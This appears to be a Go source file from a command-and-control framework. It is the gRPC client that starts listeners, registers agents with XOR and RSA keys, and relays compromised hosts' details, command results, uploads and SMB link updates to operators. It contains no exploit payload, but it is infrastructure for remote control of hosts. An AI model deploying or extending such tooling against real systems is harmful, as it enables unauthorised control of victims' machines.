// internal/websocket/agent/client.go
package agent

import (
	pb "c2/proto"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"sync"
	"sync/atomic"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/connectivity"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/health/grpc_health_v1"
)

// CircuitState represents the state of the circuit breaker
type CircuitState int32

const (
	StateClosed CircuitState = iota
	StateOpen
	StateHalfOpen
)

type Client struct {
	client          pb.AgentControlClient
	conn            *grpc.ClientConn
	stream          pb.AgentControl_BiDiStreamClient
	clientID        string
	messageHandlers map[string]func(*pb.StreamMessage) error
	Hub             HubInterface
}

// CircuitBreaker wraps the Client with circuit breaker pattern
type CircuitBreaker struct {
	*Client
	maxFailures     int32
	resetTimeout    time.Duration
	halfOpenTimeout time.Duration

	state           atomic.Int32
	failures        atomic.Int32
	successCount    atomic.Int32
	lastFailureTime atomic.Value

	mu      sync.RWMutex
	metrics *CircuitMetrics
}

// CircuitMetrics tracks circuit breaker metrics
type CircuitMetrics struct {
	TotalRequests       atomic.Uint64
	TotalFailures       atomic.Uint64
	TotalSuccesses      atomic.Uint64
	CircuitOpenCount    atomic.Uint64
	LastStateChangeTime atomic.Value
}

type HubInterface interface {
	HandleNewConnection(notification *pb.ConnectionNotification)
	BroadcastToAll(ctx context.Context, message []byte) error
}

func NewClient(address, clientID string) (*Client, error) {
	maxRetries := 5
	var conn *grpc.ClientConn

	for attempt := 0; attempt < maxRetries; attempt++ {
		// Try to establish connection
		creds, err := credentials.NewClientTLSFromFile(
			"/app/certs/rpc_server.crt",
			"localhost",
		)
		if err != nil {
			return nil, fmt.Errorf("failed to load TLS creds: %v", err)
		}

		// Create connection options
		opts := []grpc.DialOption{
			grpc.WithTransportCredentials(creds),
		}

		// Create new client
		conn, err = grpc.NewClient(address, opts...)
		if err != nil {
			if attempt < maxRetries-1 {
				delay := time.Duration(math.Pow(2, float64(attempt))) * time.Second
				log.Printf("Failed to create gRPC client (attempt %d/%d): %v. Retrying in %v...",
					attempt+1, maxRetries, err, delay)
				time.Sleep(delay)
				continue
			}
			return nil, fmt.Errorf("failed to create gRPC client after %d attempts: %v", maxRetries, err)
		}

		// Attempt connection
		conn.Connect()

		// Wait for a bit to let connection establish
		time.Sleep(time.Second)

		// Check connection health
		if conn.GetState() == connectivity.Ready {
			// Test the connection with a health check
			healthClient := grpc_health_v1.NewHealthClient(conn)
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			resp, err := healthClient.Check(ctx, &grpc_health_v1.HealthCheckRequest{})
			cancel()

			if err == nil && resp.Status == grpc_health_v1.HealthCheckResponse_SERVING {
				break // Successfully connected and service is ready
			}
		}

		conn.Close()
	}

	if conn == nil || conn.GetState() != connectivity.Ready {
		return nil, fmt.Errorf("failed to establish ready connection after %d attempts", maxRetries)
	}

	client := &Client{
		client:          pb.NewAgentControlClient(conn),
		conn:            conn,
		clientID:        clientID,
		messageHandlers: make(map[string]func(*pb.StreamMessage) error),
	}

	client.registerMessageHandlers()
	return client, nil
}

// EnhanceClientWithCircuitBreaker wraps existing client with circuit breaker
func EnhanceClientWithCircuitBreaker(client *Client) *CircuitBreaker {
	cb := &CircuitBreaker{
		Client:          client,
		maxFailures:     5,                // Hardcoded max failures
		resetTimeout:    30 * time.Second, // Hardcoded reset timeout
		halfOpenTimeout: 10 * time.Second, // Hardcoded half-open timeout
		metrics:         &CircuitMetrics{},
	}

	cb.state.Store(int32(StateClosed))
	cb.metrics.LastStateChangeTime.Store(time.Now())

	// Start reset timer
	go cb.monitorCircuit()

	return cb
}

// ExecuteWithBreaker executes a function with circuit breaker protection
func (cb *CircuitBreaker) ExecuteWithBreaker(ctx context.Context, operation string, fn func() error) error {
	state := CircuitState(cb.state.Load())

	// Check if circuit allows request
	if !cb.shouldAttempt(state) {
		cb.metrics.TotalRequests.Add(1)
		return fmt.Errorf("circuit breaker OPEN for operation: %s", operation)
	}

	// Record request
	cb.metrics.TotalRequests.Add(1)

	// Execute with timeout
	execCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	done := make(chan error, 1)
	go func() {
		done <- fn()
	}()

	select {
	case err := <-done:
		if err != nil {
			cb.recordFailure(state, operation)
			return err
		}
		cb.recordSuccess(state)
		return nil

	case <-execCtx.Done():
		cb.recordFailure(state, operation)
		return fmt.Errorf("operation %s timed out", operation)
	}
}

// shouldAttempt determines if a request should be attempted
func (cb *CircuitBreaker) shouldAttempt(state CircuitState) bool {
	switch state {
	case StateClosed:
		return true

	case StateOpen:
		lastFailure, ok := cb.lastFailureTime.Load().(time.Time)
		if ok && time.Since(lastFailure) > cb.resetTimeout {
			cb.transitionTo(StateHalfOpen)
			return true
		}
		return false

	case StateHalfOpen:
		return true

	default:
		return false
	}
}

// recordSuccess records a successful operation
func (cb *CircuitBreaker) recordSuccess(fromState CircuitState) {
	cb.metrics.TotalSuccesses.Add(1)
	cb.successCount.Add(1)

	switch fromState {
	case StateHalfOpen:
		if cb.successCount.Load() >= 3 {
			cb.transitionTo(StateClosed)
			cb.failures.Store(0)
			cb.successCount.Store(0)
			log.Printf("[CircuitBreaker] Circuit CLOSED after recovery")
		}

	case StateClosed:
		if cb.failures.Load() > 0 {
			cb.failures.Store(0)
		}
	}
}

// recordFailure records a failed operation
func (cb *CircuitBreaker) recordFailure(fromState CircuitState, operation string) {
	cb.metrics.TotalFailures.Add(1)
	cb.failures.Add(1)
	cb.successCount.Store(0)
	cb.lastFailureTime.Store(time.Now())

	failures := cb.failures.Load()

	switch fromState {
	case StateClosed:
		if failures >= cb.maxFailures {
			cb.transitionTo(StateOpen)
			cb.metrics.CircuitOpenCount.Add(1)
			log.Printf("[CircuitBreaker] Circuit OPEN after %d failures in operation: %s",
				failures, operation)
		}

	case StateHalfOpen:
		cb.transitionTo(StateOpen)
		log.Printf("[CircuitBreaker] Circuit back to OPEN after failure in half-open state")
	}
}

// transitionTo changes the circuit state
func (cb *CircuitBreaker) transitionTo(newState CircuitState) {
	oldState := CircuitState(cb.state.Swap(int32(newState)))

	if oldState != newState {
		cb.metrics.LastStateChangeTime.Store(time.Now())
		log.Printf("[CircuitBreaker] State transition: %s -> %s",
			stateString(oldState), stateString(newState))
	}
}

// monitorCircuit monitors and resets the circuit periodically
func (cb *CircuitBreaker) monitorCircuit() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		state := CircuitState(cb.state.Load())

		if state == StateOpen {
			lastFailure, ok := cb.lastFailureTime.Load().(time.Time)
			if ok && time.Since(lastFailure) > cb.resetTimeout {
				cb.transitionTo(StateHalfOpen)
				log.Printf("[CircuitBreaker] Attempting recovery, transitioning to HALF_OPEN")
			}
		}
	}
}

// GetMetrics returns circuit breaker metrics
func (cb *CircuitBreaker) GetMetrics() map[string]interface{} {
	lastChange, _ := cb.metrics.LastStateChangeTime.Load().(time.Time)
	lastFailure, _ := cb.lastFailureTime.Load().(time.Time)

	return map[string]interface{}{
		"state":               stateString(CircuitState(cb.state.Load())),
		"failures":            cb.failures.Load(),
		"success_count":       cb.successCount.Load(),
		"total_requests":      cb.metrics.TotalRequests.Load(),
		"total_failures":      cb.metrics.TotalFailures.Load(),
		"total_successes":     cb.metrics.TotalSuccesses.Load(),
		"circuit_opens":       cb.metrics.CircuitOpenCount.Load(),
		"last_state_change":   lastChange,
		"last_failure":        lastFailure,
		"uptime_since_change": time.Since(lastChange),
	}
}

func stateString(state CircuitState) string {
	switch state {
	case StateClosed:
		return "CLOSED"
	case StateOpen:
		return "OPEN"
	case StateHalfOpen:
		return "HALF_OPEN"
	default:
		return "UNKNOWN"
	}
}

// Original Client methods

func (c *Client) GetListenerType(listenerType string) pb.ListenerType {
	switch listenerType {
	case "HTTP":
		return pb.ListenerType_HTTP
	case "HTTPS":
		return pb.ListenerType_HTTPS
	case "TCP":
		return pb.ListenerType_TCP
	case "UDP":
		return pb.ListenerType_UDP
	default:
		return pb.ListenerType_UNKNOWN
	}
}

func (c *Client) registerMessageHandlers() {
	c.messageHandlers["new_connection"] = c.handleNewConnection
	c.messageHandlers["command_result"] = c.handleCommandResult
	c.messageHandlers["agent_checkin"] = c.handleAgentCheckin
	c.messageHandlers["upload_complete"] = c.handleUploadComplete
	c.messageHandlers["link_update"] = c.handleLinkUpdate
	c.messageHandlers["command_ack"] = c.handleCommandAck
	c.messageHandlers["pong"] = c.handlePong // Silent keepalive response
}

// handlePong silently handles pong keepalive responses
func (c *Client) handlePong(msg *pb.StreamMessage) error {
	// Pong is just a keepalive acknowledgment - no action needed
	return nil
}

func (c *Client) StartListener(ctx context.Context, name string, port int32, listenerType pb.ListenerType, secure bool, getProfile, postProfile, serverResponseProfile string) (*pb.ListenerResponse, error) {
	req := &pb.ListenerRequest{
		Name:                  name,
		Port:                  port,
		Type:                  listenerType,
		Secure:                secure,
		BindIp:                "0.0.0.0", // Optional, can be taken from default if empty
		GetProfile:            getProfile,
		PostProfile:           postProfile,
		ServerResponseProfile: serverResponseProfile,
	}

	resp, err := c.client.StartListener(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("gRPC StartListener call failed: %v", err)
	}

	return resp, nil
}

func (c *Client) StopListener(ctx context.Context, name string) error {
	req := &pb.ListenerRequest{
		Name: name,
	}

	resp, err := c.client.StopListener(ctx, req)
	if err != nil {
		return fmt.Errorf("gRPC StopListener call failed: %v", err)
	}

	if !resp.Success {
		return fmt.Errorf("failed to stop listener: %s (error code: %d)",
			resp.Message, resp.ErrorCode)
	}

	return nil
}

func (c *Client) SetHub(hub HubInterface) {
	c.Hub = hub
}

func (c *Client) StartBiDiStream(ctx context.Context, hub HubInterface) error {
	if hub != nil {
		c.SetHub(hub)
	}

	stream, err := c.client.BiDiStream(ctx)
	if err != nil {
		return fmt.Errorf("failed to establish BiDiStream: %v", err)
	}
	c.stream = stream

	err = c.SendToStream("client_connected", map[string]interface{}{
		"message": "Client has connected to the stream",
	})
	if err != nil {
		return fmt.Errorf("failed to send initial message: %v", err)
	}

	go func() {
		for {
			msg, err := stream.Recv()
			if err == io.EOF {
				log.Println("gRPC stream closed by server")
				return
			}
			if err != nil {
				log.Printf("Error receiving from gRPC stream: %v", err)
				return
			}

			if handler, exists := c.messageHandlers[msg.Type]; exists {
				if err := handler(msg); err != nil {
					log.Printf("[BiDiStream] Error handling message type '%s': %v", msg.Type, err)
				}
			} else {
				// Silently ignore ping messages (expected, no handler needed)
				if msg.Type != "ping" {
					log.Printf("[BiDiStream] Unhandled message type: %s", msg.Type)
				}
			}
		}
	}()

	return nil
}

func (c *Client) SendToStream(msgType string, payload map[string]interface{}) error {
	//log.Printf("[SendToStream] Starting send for type: %s", msgType)
	//log.Printf("[SendToStream] Stream state: %v", c.stream != nil)
	if c.stream == nil {
		log.Printf("[SendToStream] Stream is nil, attempting to recreate")
		// Maybe we need to recreate the stream here?
		ctx := context.Background()
		stream, err := c.client.BiDiStream(ctx)
		if err != nil {
			return fmt.Errorf("failed to recreate stream: %v", err)
		}
		c.stream = stream
		log.Printf("[SendToStream] Successfully recreated stream")
	}

	// Marshal the entire payload into JSON
	contentBytes, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	msg := &pb.StreamMessage{
		Sender:    c.clientID,
		Type:      msgType,
		Content:   string(contentBytes),
		Timestamp: time.Now().Unix(),
	}

	//log.Printf("[SendToStream] Attempting to send message of type: %s", msgType)
	err = c.stream.Send(msg)
	if err != nil {
		log.Printf("[SendToStream] Failed to send message: %v", err)
		return fmt.Errorf("failed to send message: %v", err)
	}

	//log.Printf("[SendToStream] Successfully sent message")
	return nil
}

func (c *Client) Close() error {
	return c.conn.Close()
}

func ParseListenerType(listenerTypeStr string) (pb.ListenerType, error) {
	switch listenerTypeStr {
	case "HTTP":
		return pb.ListenerType_HTTP, nil
	case "HTTPS":
		return pb.ListenerType_HTTPS, nil
	case "TCP":
		return pb.ListenerType_TCP, nil
	case "UDP":
		return pb.ListenerType_UDP, nil
	case "RPC", "SMB":
		// Log a warning and indicate that these types should not be used to start a listener in the agent service
		return pb.ListenerType_UNKNOWN, fmt.Errorf("listener type '%s' is not supported for starting in the agent service", listenerTypeStr)
	default:
		return pb.ListenerType_UNKNOWN, fmt.Errorf("invalid listener type: %s", listenerTypeStr)
	}
}

func (c *Client) RegisterInit(ctx context.Context, initData map[string]string) error {
	req := &pb.InitRequest{
		Id:         initData["id"],
		ClientId:   initData["clientID"],
		Type:       initData["type"],
		Secret:     initData["secret"],
		Os:         initData["os"],
		Arch:       initData["arch"],
		RsaKey:     initData["rsaKey"],
		Protocol:   initData["protocol"],
		SmbProfile: initData["smbProfile"],
		SmbXorKey:  initData["smbXorKey"],
		HttpXorKey: initData["httpXorKey"],
	}

	resp, err := c.client.RegisterInit(ctx, req)
	if err != nil {
		return fmt.Errorf("gRPC RegisterInit call failed: %v", err)
	}

	if !resp.Success {
		return fmt.Errorf("failed to register init data: %s (error code: %d)",
			resp.Message, resp.ErrorCode)
	}

	return nil
}

func (c *Client) NotifyNewConnection(ctx context.Context, notification *pb.ConnectionNotification) (*pb.ConnectionResponse, error) {
	resp, err := c.client.NotifyNewConnection(ctx, notification)
	if err != nil {
		return nil, fmt.Errorf("gRPC NotifyNewConnection call failed: %v", err)
	}
	return resp, nil
}

func (c *Client) handleNewConnection(msg *pb.StreamMessage) error {
	if c.Hub == nil {
		return fmt.Errorf("hub not initialized")
	}

	var connData struct {
		NewClientID    string `json:"new_client_id"`
		ClientID       string `json:"client_id"`
		Protocol       string `json:"protocol"`
		ExtIP          string `json:"ext_ip"`
		IntIP          string `json:"int_ip"`
		Username       string `json:"username"`
		Hostname       string `json:"hostname"`
		Process        string `json:"process"`
		PID            string `json:"pid"`
		Arch           string `json:"arch"`
		OS             string `json:"os"`
		LastSeen       int64  `json:"last_seen"`
		ParentClientID string `json:"parent_client_id,omitempty"` // For linked agents
		LinkType       string `json:"link_type,omitempty"`        // Link type (e.g., "smb")
	}

	if err := json.Unmarshal([]byte(msg.Content), &connData); err != nil {
		return fmt.Errorf("failed to unmarshal 'new_connection' message content: %v", err)
	}

	notification := &pb.ConnectionNotification{
		NewClientId:    connData.NewClientID,
		ClientId:       connData.ClientID,
		Protocol:       connData.Protocol,
		ExtIp:          connData.ExtIP,
		IntIp:          connData.IntIP,
		Username:       connData.Username,
		Hostname:       connData.Hostname,
		Process:        connData.Process,
		Pid:            connData.PID,
		Arch:           connData.Arch,
		Os:             connData.OS,
		LastSeen:       connData.LastSeen,
		ParentClientId: connData.ParentClientID,
		LinkType:       connData.LinkType,
	}

	c.Hub.HandleNewConnection(notification)
	return nil
}

func (c *Client) handleCommandResult(msg *pb.StreamMessage) error {
	var resultData struct {
		AgentID   string `json:"agent_id"`
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		Timestamp string `json:"timestamp"`
		Status    string `json:"status"`
	}

	if err := json.Unmarshal([]byte(msg.Content), &resultData); err != nil {
		return fmt.Errorf("failed to unmarshal command result: %v", err)
	}

	// Create broadcast message
	broadcastMsg := struct {
		Type string      `json:"type"`
		Data interface{} `json:"data"`
	}{
		Type: "command_result",
		Data: resultData,
	}

	// Marshal the broadcast message
	broadcastJSON, err := json.Marshal(broadcastMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal broadcast message: %v", err)
	}

	// Create a context with timeout for broadcasting
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Broadcast to all connected websocket clients
	if c.Hub != nil {
		err = c.Hub.BroadcastToAll(ctx, broadcastJSON)
		if err != nil {
			return fmt.Errorf("failed to broadcast command result: %v", err)
		}
	}

	return nil
}

func (c *Client) handleAgentCheckin(msg *pb.StreamMessage) error {
	log.Printf("[AgentCheckin] Received agent checkin message: %s", msg.Content)

	// First unmarshal the complete message
	var fullMessage struct {
		Type string `json:"type"`
		Data struct {
			AgentID  string `json:"agent_id"`
			LastSeen int64  `json:"last_seen"`
		} `json:"data"`
	}

	if err := json.Unmarshal([]byte(msg.Content), &fullMessage); err != nil {
		return fmt.Errorf("failed to unmarshal agent checkin data: %v", err)
	}

	// Reuse the same structure for broadcasting
	broadcastJSON, err := json.Marshal(fullMessage)
	if err != nil {
		return fmt.Errorf("failed to marshal broadcast message: %v", err)
	}

	// Create a context with timeout for broadcasting
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Broadcast to all connected websocket clients
	if c.Hub != nil {
		err = c.Hub.BroadcastToAll(ctx, broadcastJSON)
		if err != nil {
			return fmt.Errorf("failed to broadcast agent checkin: %v", err)
		}
		log.Printf("[AgentCheckin] Successfully broadcast agent checkin to all clients")
	}

	return nil
}

func (c *Client) HandleUpload(ctx context.Context, req *pb.HandleUploadRequest) (*pb.HandleUploadResponse, error) {
	log.Printf("Sending HandleUpload request to agent service for file: %s -> %s",
		req.OriginalFilename, req.CurrentFilename)

	resp, err := c.client.HandleUpload(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("gRPC HandleUpload call failed: %v", err)
	}

	log.Printf("HandleUpload response received - Success: %v, Message: %s",
		resp.Success, resp.Message)
	return resp, nil
}

// Add handler for upload complete messages
func (c *Client) handleUploadComplete(msg *pb.StreamMessage) error {
	var uploadData struct {
		AgentID   string `json:"agent_id"`
		FileName  string `json:"file_name"`
		Status    string `json:"status"`
		Message   string `json:"message"`
		Timestamp string `json:"timestamp"`
	}

	if err := json.Unmarshal([]byte(msg.Content), &uploadData); err != nil {
		return fmt.Errorf("failed to unmarshal upload complete message: %v", err)
	}

	// Create broadcast message for websocket clients
	broadcastMsg := struct {
		Type string      `json:"type"`
		Data interface{} `json:"data"`
	}{
		Type: "upload_complete",
		Data: uploadData,
	}

	// Marshal the broadcast message
	broadcastJSON, err := json.Marshal(broadcastMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal broadcast message: %v", err)
	}

	// Broadcast to all connected websocket clients
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if c.Hub != nil {
		if err := c.Hub.BroadcastToAll(ctx, broadcastJSON); err != nil {
			return fmt.Errorf("failed to broadcast upload complete: %v", err)
		}
		log.Printf("[UploadComplete] Successfully broadcast upload complete to all clients")
	}

	return nil
}

// handleLinkUpdate handles link_update messages from the agent handler and broadcasts to websocket clients
func (c *Client) handleLinkUpdate(msg *pb.StreamMessage) error {
	log.Printf("[LinkUpdate] Received link update message: %s", msg.Content)

	// The message content is already in the correct format from the agent handler:
	// {"type":"link_update","data":{"agent_id":"...","parent_client_id":"...","link_type":"..."}}
	// Just forward it directly to websocket clients
	broadcastJSON := []byte(msg.Content)

	// Broadcast to all connected websocket clients
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if c.Hub != nil {
		if err := c.Hub.BroadcastToAll(ctx, broadcastJSON); err != nil {
			return fmt.Errorf("failed to broadcast link update: %v", err)
		}
		log.Printf("[LinkUpdate] Successfully broadcast link update to all clients")
	}

	return nil
}

// SyncProfiles sends profile updates to the agent-handler service
// This is called when profiles are uploaded via websocket to ensure the agent-handler
// can route requests using the new profile paths
func (c *Client) SyncProfiles(profiles map[string]interface{}) error {
	return c.SendToStream("sync_profiles", profiles)
}

// handleCommandAck handles command_ack messages from the agent handler and broadcasts to websocket clients
// This is sent AFTER the command is stored in the database, so it includes the db_id
func (c *Client) handleCommandAck(msg *pb.StreamMessage) error {
	log.Printf("[CommandAck] Received command ack message: %s", msg.Content)

	// Parse the message content to wrap it properly for WebSocket clients
	var ackData map[string]interface{}
	if err := json.Unmarshal([]byte(msg.Content), &ackData); err != nil {
		return fmt.Errorf("failed to parse command_ack content: %v", err)
	}

	// The message from agent-handler has: type, command_id, agent_id, db_id, status, timestamp
	// We need to wrap it for WebSocket clients
	broadcastMsg := map[string]interface{}{
		"type": "command_ack",
		"data": map[string]interface{}{
			"agent_id":   ackData["agent_id"],
			"command_id": ackData["command_id"],
			"db_id":      ackData["db_id"],
			"status":     ackData["status"],
			"timestamp":  ackData["timestamp"],
		},
	}

	broadcastJSON, err := json.Marshal(broadcastMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal command_ack broadcast: %v", err)
	}

	// Broadcast to all connected websocket clients
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if c.Hub != nil {
		if err := c.Hub.BroadcastToAll(ctx, broadcastJSON); err != nil {
			return fmt.Errorf("failed to broadcast command_ack: %v", err)
		}
		log.Printf("[CommandAck] Successfully broadcast command_ack to all clients (db_id=%v)", ackData["db_id"])
	}

	return nil
}
